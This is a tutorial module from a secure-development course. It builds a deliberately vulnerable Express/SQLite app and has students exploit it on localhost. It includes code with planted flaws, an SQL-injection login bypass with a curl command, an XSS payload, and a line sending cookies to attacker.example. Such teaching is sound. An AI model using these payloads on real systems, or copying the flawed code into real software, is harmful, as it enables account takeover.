# Module 1 — Build the Vulnerable App (and break it yourself)

> **Goal:** understand every line of a small Node/Express/SQLite web app, then
> personally exploit three of the nine flaws planted in it. By the end you will
> have logged in without a password and stolen a session cookie.
>
> **Prerequisite:** Module 0.

---

## 1.1 — Why start with something broken

It is tempting to write the secure version immediately. Don't. If you go
straight to `bcrypt.hash()`, you learn a ritual: *this is the incantation for
passwords*. If you first watch `SELECT * FROM users WHERE username = '' OR
'1'='1' --'` return an admin row, you learn a *mechanism*, and mechanisms
transfer. The same mechanism explains XSS, command injection, LDAP injection,
template injection, and prompt injection.

Every flaw in this app is tagged in the source with the same header format:

```
VULNERABILITY #n — short name
CWE-xxx | OWASP A0x:2021 | Caught later by: <tool> | Fixed in: Module n
```

That tag is a contract. By Module 11, every one of the nine has a named gate.

---

## 1.2 — What a web server actually is

Before the code: a web server is a program that sits on a **port** (here, 3000)
and waits. A browser opens a TCP connection and sends text like:

```
GET /dashboard HTTP/1.1
Host: localhost:3000
Cookie: connect.sid=s%3AabC123...
```

The server sends text back:

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<!doctype html><html>...
```

That's the whole protocol. Everything else — frameworks, sessions, cookies — is
convenience built on top of "send text, get text back."

Two things matter enormously for security:

1. **Everything in that request is attacker-controlled.** The path, the query
   string, the headers, the cookies, the body. All of it. "The browser wouldn't
   send that" is not a security control — `curl` is not a browser.
2. **HTTP is stateless.** The server has no memory between requests. Which is
   why we need sessions.

### Sessions and cookies, precisely

Since HTTP forgets you between requests, we do this:

1. You log in successfully.
2. The server generates a random **session ID**, stores `{sessionID → your user
   record}` in its memory, and sends back `Set-Cookie: connect.sid=<signed ID>`.
3. Your browser attaches that cookie to every subsequent request automatically.
4. The server looks up the ID and knows who you are.

The session ID is therefore **equivalent to your password** for as long as it
lives. Anything that leaks it — XSS reading `document.cookie`, plain HTTP on
shared wifi, a URL that contains it — is a full account takeover. Hold that
thought; it's exactly the chain you'll exploit in §1.7.

---

## 1.3 — `package.json`, line by line

```json
{
  "name": "secure-sdlc-lab",
  "main": "src/app.js",
  "scripts": { "start": "node src/app.js" },
  "dependencies": {
    "express": "^4.18.2",
    "express-session": "^1.17.3",
    "sqlite3": "^5.1.6"
  }
}
```

- **`dependencies`** — packages downloaded from the npm registry when you run
  `npm install`. Three lines here; **195 packages** actually land in
  `node_modules/`, because your dependencies have dependencies. Those are
  **transitive** dependencies, and they are the bulk of your real attack surface.

- **`^4.18.2`** — the caret is a *range*: "4.18.2 or newer, but stay below 5.0.0."
  Convenient, and a supply-chain risk: two people running `npm install` on
  different days can get different code. That's what `package-lock.json` is for —
  it records the exact resolved version of every one of the 195 packages. **Always
  commit the lockfile.** Module 5 scans it.

- These versions are deliberately a bit old, so Module 5 has real CVEs to find.
  It works — `npm audit` on this project already reports **7 vulnerabilities
  (1 critical, 4 high)** before we have written a single feature.

---

## 1.4 — `src/db.js`, line by line

```js
const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database('./lab.db');
```

`require` is Node's import. SQLite keeps an entire database in **one file** —
no server, no credentials. Perfect for a lab, wrong for production, and
irrelevant to what we're learning: the SQL is identical either way.

```sql
CREATE TABLE IF NOT EXISTS users (
  id       INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT UNIQUE NOT NULL,
  password TEXT NOT NULL,
  role     TEXT NOT NULL DEFAULT 'user'
)
```

### 🔴 VULNERABILITY #2 — plaintext passwords (CWE-256, OWASP A02)

`password TEXT` holds the literal string the user typed. Consequences:

- Any read of that table — leaked backup, SQL injection, a curious DBA, a stolen
  laptop — is instant total compromise of every account.
- People reuse passwords, so your breach becomes their bank's breach.
- You can never truthfully tell a user "we don't know your password."

Note *what kind* of control fixes this: not a scanner. Hashing is a design
decision, made in Module 2's threat model and implemented in Module 4. Scanners
are bad at "you stored the wrong thing"; they're good at "you used the wrong
function."

---

## 1.5 — `src/app.js`: the middleware stack

```js
app.use(express.urlencoded({ extended: false }));
```

**Middleware** is a function that runs on every request before your route
handler. Think of a pipeline: request enters, passes through each middleware in
registration order, reaches a route. Each one may read, modify, or halt it.

This particular one parses HTML form bodies into `req.body`. Without it,
`req.body` is `undefined` and every login crashes.

```js
app.use(session({
  secret: 'sk_lab_9f2c4e8a71b3d6f05c8e2a4b7d9f1c3e',
  cookie: { httpOnly: false, secure: false },
}));
```

### 🔴 VULNERABILITY #3 — hardcoded secret in source (CWE-798, OWASP A07)

`secret` is the key used to **sign** the session cookie, proving the server
issued it. Know the key, forge a cookie, become the admin — no password needed.

The important lesson is not "that value is weak." It's **that value is in git**.

> Git is append-only. Deleting the line in a later commit does not remove the
> secret from history. It stays in every clone, every fork, every CI cache,
> forever. The only real remediation for a committed secret is **rotation** —
> changing the value at its source.

That property is precisely why secret scanning runs *first* in a pipeline, and
ideally as a **pre-commit hook**, before the value ever reaches a remote.
Module 3.

### 🔴 VULNERABILITY #4 — insecure cookie flags (CWE-1004/614, OWASP A05)

| Flag | We set | Should be | Why |
|---|---|---|---|
| `httpOnly` | `false` | `true` | `false` lets page JavaScript read the cookie via `document.cookie`. Chain with XSS → session theft. |
| `secure` | `false` | `true` | `false` sends the cookie over plain HTTP. Anyone on the network path reads it. |
| `sameSite` | *(unset)* | `'lax'` or `'strict'` | Unset invites CSRF — another site can make your browser send authenticated requests. |

---

## 1.6 — The routes

### `GET /` — the login form

```js
app.get('/', (req, res) => { ... });
```

`app.get(path, handler)` registers a handler for HTTP GET. GET means "give me a
representation" and **must not change state**. The form uses POST, because
logging in *does* change state — and because GET parameters land in browser
history, server access logs, and `Referer` headers sent to third parties.

### `POST /login` — the main event

```js
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
db.get(query, (err, user) => { ... });
```

### 🔴 VULNERABILITY #1 — SQL injection (CWE-89, OWASP A03)

Say the root cause precisely, because the precise version is the one that
transfers to every other injection bug:

> We are constructing a **program** (SQL) by concatenating a trusted template
> with untrusted input. The database receives one flat string and parses **all**
> of it as code. It has no way to know which characters came from the developer
> and which came from the attacker.

Submit `' OR '1'='1' --` as the username:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything'
                                     └──────┬──────┘└──────────┬─────────────┘
                                     always true          commented out
```

The `'` closes the string, `OR '1'='1'` makes the WHERE clause tautologically
true, and `--` comments out the rest of the line including the password check.
Every row matches. `db.get` returns the first one. You're logged in.

**Why the obvious fixes are wrong:**

- *"Escape the quotes"* — you will miss an encoding. Unicode, double-encoding,
  and dialect quirks have defeated every hand-rolled escaper ever written.
- *"Block the word OR"* — a denylist. `||` concatenates in SQL too. `UNION`,
  `/**/`, hex literals. You cannot enumerate badness.
- *"Validate the input"* — good defence in depth, but it is not the fix, because
  it leaves the dangerous construction in place for the next developer.

**The actual fix** is to stop concatenating. A **parameterized query** sends the
SQL and the data over *separate channels*: the database parses the query first,
producing a fixed execution plan with holes in it, and only then binds your
values into the holes as pure data. The parser is already finished. There is no
character an attacker can send that becomes code, because by the time their
input arrives, nothing is being parsed anymore.

```js
db.get('SELECT * FROM users WHERE username = ?', [username], cb);  // Module 4
```

That structural distinction — *code and data on separate channels* — is the
single most valuable idea in this module.

### 🔴 VULNERABILITY #6 — verbose errors (CWE-209)

```js
return res.status(500).send(page('Error', `<pre>${err.message}</pre>`));
```

Returning raw database errors hands an attacker a free map: table names, column
names, SQL dialect, driver version. Blind injection is slow and painful;
error-based injection is fast. Don't narrate your internals to strangers.

### 🔴 VULNERABILITY #7 — no session regeneration (CWE-384)

```js
req.session.user = { ... };   // reuses the pre-login session ID
```

The visitor already had a session ID before authenticating; we staple an
identity onto it. In a **session fixation** attack, the attacker plants a known
session ID in the victim's browser first; when the victim logs in, the
attacker's session silently becomes an authenticated one.

**Rule:** whenever the privilege level of a session changes — login, logout,
role elevation, step-up auth — issue a brand-new session ID.

### `GET /admin`

```js
if (!req.session.user) return res.redirect('/');   // ← the only check
```

### 🔴 VULNERABILITY #8 — broken access control (CWE-862, OWASP A01)

We check that **somebody** is logged in. We never check **who**. `alice`, role
`user`, can read every account — including the plaintext passwords — by typing
the URL.

This is the most important flaw in the file, for a reason that has nothing to do
with the bug itself:

> **No scanner in this entire lab will find it.**

Semgrep doesn't know your business rules. Trivy scans dependencies. ZAP doesn't
have an unprivileged account to try the admin URL with unless you configure one.
This defect is caught by **threat modelling** (Module 2) and **code review** —
human activities. Which is the whole argument for a secure *SDLC* rather than a
pile of scanners: A01 Broken Access Control is the **#1** category in the OWASP
Top 10, and it is the category automation is worst at.

Authentication answers *who are you*. Authorization answers *what may you do*.
Conflating them is the bug.

### `GET /search`

```js
res.send(page('Search', `<p>You searched for: ${q}</p>`));
```

### 🔴 VULNERABILITY #5 — reflected XSS (CWE-79, OWASP A03)

Structurally **identical** to the SQL injection — user input pasted straight
into a program. The program is HTML instead of SQL, and the interpreter is the
victim's browser instead of the database. Notice how the same mental model
covers both.

The fix is **contextual output encoding**: escape for the context the value
lands in, at the moment it lands there. `<` becomes `&lt;`, so the browser
renders the characters instead of parsing a tag. Note *output*, not input — the
same string is dangerous in HTML, harmless in JSON, and differently dangerous
inside a `<script>` block or a URL attribute.

### 🔴 VULNERABILITY #9 — no security headers (CWE-693, OWASP A05)

A default Express response ships **no** `Content-Security-Policy`, no
`X-Content-Type-Options`, no `X-Frame-Options`, no `Strict-Transport-Security` —
and helpfully advertises `X-Powered-By: Express` so attackers know what to
target. These are defence in depth: a strict CSP can neuter the XSS above even
if the encoding bug survives review. Module 6 adds Helmet; Module 9's DAST scan
is what proves the headers are actually present in production responses.

---

## 1.7 — Lab: break it yourself

Run it:

```bash
npm install
npm start
# → http://localhost:3000
```

### Exploit 1 — authentication bypass via SQL injection

Open <http://localhost:3000>. Username: `' OR '1'='1' --`  Password: anything.

You land on the dashboard as **admin**.

Watch the terminal — the app prints every query it runs:

```
[SQL] SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything'
```

Same thing from the command line, which also proves the browser is not a
security boundary:

```bash
curl -i -X POST \
  --data-urlencode "username=' OR '1'='1' --" \
  --data-urlencode "password=anything" \
  http://localhost:3000/login
```

```
HTTP/1.1 302 Found
Location: /dashboard        ← logged in, no valid password
```

### Exploit 2 — reflected XSS

```
http://localhost:3000/search?q=<script>alert(document.cookie)</script>
```

An alert box shows your session cookie. It is readable **only because**
`httpOnly:false` (VULN #4). Two individually "medium" bugs compose into full
account takeover: send that URL to a logged-in admin, and instead of `alert()`
use `fetch('https://attacker.example/?c='+document.cookie)`.

> **Composition is the thing.** Severity ratings are assigned per-finding;
> attackers chain findings. This is a permanent limitation of every scanner
> output you will ever read, and a permanent argument for threat modelling.

### Exploit 3 — broken access control

Log in properly as `alice / password1` (a plain, unprivileged user). Then just
visit:

```
http://localhost:3000/admin
```

Every account, every plaintext password. No exploit needed — the URL *is* the
exploit. Now recall that no scanner in this lab finds this.

### Exploit 4 — look at what isn't there

```bash
curl -I http://localhost:3000/
```

```
HTTP/1.1 200 OK
X-Powered-By: Express            ← free reconnaissance for an attacker
Content-Type: text/html; charset=utf-8
```

No CSP. No HSTS. No `X-Frame-Options`. No `X-Content-Type-Options`.
This absence is exactly what OWASP ZAP will report in Module 9 — and it's a
good example of a finding with essentially **zero false-positive rate**: the
header was either in the response or it wasn't.

### Exploit 5 — you haven't written a feature yet and you're already vulnerable

```bash
npm audit
```

```
7 vulnerabilities (2 low, 4 high, 1 critical)
```

Three lines in `dependencies`. 195 packages on disk. One critical CVE. This is
why Module 5 exists, and why SCA is, for most teams, higher-yield than SAST.

---

## 1.8 — The scoreboard

Keep this table open for the rest of the course. Each module fills a row.

| # | Flaw | CWE | OWASP | Found by | Fixed in |
|---|---|---|---|---|---|
| 1 | SQL injection | CWE-89 | A03 | Semgrep (SAST) | Module 4 |
| 2 | Plaintext passwords | CWE-256 | A02 | threat model | Module 4 |
| 3 | Hardcoded secret | CWE-798 | A07 | Gitleaks | Module 3 |
| 4 | Insecure cookie flags | CWE-1004/614 | A05 | ZAP (DAST) | Module 6 |
| 5 | Reflected XSS | CWE-79 | A03 | Semgrep + ZAP | Module 6 |
| 6 | Verbose errors | CWE-209 | A05 | ZAP | Module 6 |
| 7 | No session regeneration | CWE-384 | A07 | code review | Module 6 |
| 8 | **Broken access control** | CWE-862 | **A01** | **threat model only** | Module 6 |
| 9 | Missing security headers | CWE-693 | A05 | ZAP | Module 6 |
| — | Vulnerable dependencies | — | A06 | Trivy / npm audit | Module 5 |
| — | Container runs as root | CWE-250 | A05 | Trivy config | Module 7 |
| — | Permissive K8s manifest | CWE-250 | A05 | Trivy config | Module 8 |

Read down the "Found by" column. Three of the nine are found by humans, not
tools. That ratio is roughly what you should expect in real work, and it is the
honest answer to "can we just buy a scanner?"

---

## What's next

**Module 2** — threat modelling. We draw a data-flow diagram, walk STRIDE across
it, and see whether a structured 30-minute conversation would have predicted the
nine flaws we just planted. (Spoiler: most of them, including the one no scanner
finds.)
